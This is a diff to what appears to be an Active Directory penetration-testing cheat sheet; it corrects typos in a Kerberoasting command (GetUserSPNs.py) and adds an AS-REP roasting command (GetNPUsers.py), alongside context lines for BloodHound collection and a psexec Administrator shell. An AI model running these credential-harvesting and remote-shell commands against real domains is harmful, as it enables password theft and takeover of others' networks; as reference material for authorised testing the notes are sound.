@@ -67,5 +67,9 @@ bloodhound-python -u '<username>' -p 'password' -dc <dc-hostname> -d <fqdn> -c A
 # psexec interactive shell as Administrator
 psexec.py '<fqdn>/<username>:<password>@<target-ip-or-host>' -dc-ip <dc-ip>
 
-# GetUserSPNs.py get user accounts with mor than one service principal name (= kerberoastable) and request a TGS for them
-GetUserSPNs.py '<fqdn>/<user>:<password>' -dc-ip <dc-ip> [-request -outputfile <out-ile>]
+# GetUserSPNs.py get user accounts with more than one service principal name (= kerberoastable) and request a TGS for them
+GetUserSPNs.py '<fqdn>/<user>:<password>' -dc-ip <dc-ip> [-request -outputfile <out-file>]
+
+# GetNPUsers.py get all users and hashes in AD that have NO preauthentication enabled
+GetNPUsers.py '<fqdn>/[<username>]'  -dc-ip <dc-ip> [-request -outputfile <out-file>]
+
